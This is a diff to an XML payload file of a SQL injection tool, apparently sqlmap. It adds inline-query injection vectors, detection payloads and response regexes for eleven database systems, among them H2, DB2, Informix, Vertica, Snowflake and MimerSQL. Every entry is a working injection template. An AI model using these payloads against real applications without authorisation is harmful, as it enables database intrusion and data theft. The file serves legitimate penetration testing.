@@ -153,5 +153,214 @@
         </details>
     </test>
     
+    <test>
+        <title>H2 inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>H2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM (VALUES(0)))</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM (VALUES(0)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSIBM.SYSDUMMY1)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSIBM.SYSDUMMY1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSTABLES WHERE TABID=1)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSTABLES WHERE TABID=1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Vertica inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||([QUERY])::VARCHAR||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)::VARCHAR||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MonetDB inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MonetDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Snowflake inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END) AS VARCHAR)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>CrateDB inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>('[DELIMITER_START]'||CAST(([QUERY]) AS TEXT)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>('[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS TEXT)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Apache Derby inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSIBM.SYSDUMMY1)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSIBM.SYSDUMMY1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Apache Derby</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Altibase inline queries</title>
+        <stype>3</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Altibase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MimerSQL inline queries</title>
+        <stype>3</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSTEM.ONEROW)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||CAST((CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR(4000))||'[DELIMITER_STOP]' FROM SYSTEM.ONEROW)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MimerSQL</dbms>
+        </details>
+    </test>
+
     <!-- End of inline queries tests -->
 </root>
